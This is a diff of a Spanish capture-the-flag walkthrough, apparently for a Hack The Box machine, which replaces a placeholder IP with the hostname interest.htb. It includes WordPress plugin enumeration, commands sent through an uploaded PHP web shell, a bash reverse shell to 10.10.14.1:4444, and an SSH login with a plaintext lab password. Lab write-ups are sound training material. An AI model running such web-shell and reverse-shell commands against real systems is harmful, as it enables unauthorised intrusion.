@@ -22,21 +22,21 @@ Resultado esperado:
 
 ```
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
-80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
+80/tcp open  http    Apache httpd 2.4 ((Ubuntu))
 ```
 
-Al visitar `http://10.10.10.X/` se encuentra un sitio WordPress ("Corp Intranet").
+Al visitar `http://interest.htb/` se encuentra un sitio WordPress ("Corp Interest").
 
 ```bash
-whatweb http://10.10.10.X
-wpscan --url http://10.10.10.X --enumerate p
+whatweb http://interest.htb
+wpscan --url http://interest.htb --enumerate p
 ```
 
 `wpscan` (o una enumeración manual de `/wp-content/plugins/`) revela el plugin
 **WPvivid Backup & Migration**, y su `readme.txt` expone la versión instalada:
 
 ```bash
-curl -s http://10.10.10.X/wp-content/plugins/wpvivid-backuprestore/readme.txt | grep -i "stable tag"
+curl -s http://interest.htb/wp-content/plugins/wpvivid-backuprestore/readme.txt | grep -i "stable tag"
 # Stable tag: 0.9.123
 ```
 
@@ -87,7 +87,7 @@ El exploit:
 4. Verifica ejecución remota de comandos:
 
 ```bash
-curl "http://10.10.10.X/wp-content/uploads/<shell>.php?cmd=id"
+curl "http://interest.htb/wp-content/uploads/<shell>.php?cmd=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -95,7 +95,7 @@ Con esto obtenemos ejecución de comandos como `www-data`. Se puede estabilizar 
 reverse shell:
 
 ```bash
-curl "http://10.10.10.X/wp-content/uploads/<shell>.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261'"
+curl "http://interest.htb/wp-content/uploads/<shell>.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261'"
 ```
 
 ---
@@ -140,7 +140,7 @@ paneles de Grafana/Netdata sin autenticar, etc.).
 ## 5. Movimiento lateral → usuario
 
 ```bash
-ssh MaureDEV@10.10.10.X
+ssh MaureDEV@interest.htb
 # Password: E$toyT3ns0
 ```
 
